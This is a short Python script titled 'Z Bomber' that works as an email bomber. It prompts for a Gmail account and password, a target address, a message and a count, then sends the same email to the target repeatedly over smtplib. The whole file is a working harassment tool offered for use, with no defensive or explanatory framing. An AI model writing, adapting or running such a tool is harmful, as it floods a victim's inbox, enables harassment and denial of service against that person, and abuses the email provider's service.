import smtplib

# ASCII Image
ascii_image =  """. . .
              \|/
            `--+--'
              /|\
             ' | '
               |
               |
           ,--'#`--.
           |#######|
        _.-'#######`-._
     ,-'###############`-.
   ,'#####################`,
  /#########################\
 |###########################|
|#############################|
|#############################|
|#############################|
|#############################|
 |###########################|
  \#########################/
   `.#####################,'
     `._###############_,'
        `--..#####..--'

------------------------------------------------
Z Bomber"""

print(ascii_image)

# Email Variables
from_email = input("What email would you like to use to send the bomb? ")
password = input("What is the password for the email? ")
to_email = input("What email would you like to bomb? ")
subject = input("What would you like the subject to be? ")
body = input("What would you like the message to be? ")
num_emails = int(input("How many emails would you like to send? "))

# Send Email
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(from_email, password)
for i in range(num_emails):
    message = f'Subject: {subject}\n\n{body}'
    server.sendmail(from_email, to_email, message)
    print(f'Email {i+1} sent!')

server.quit()
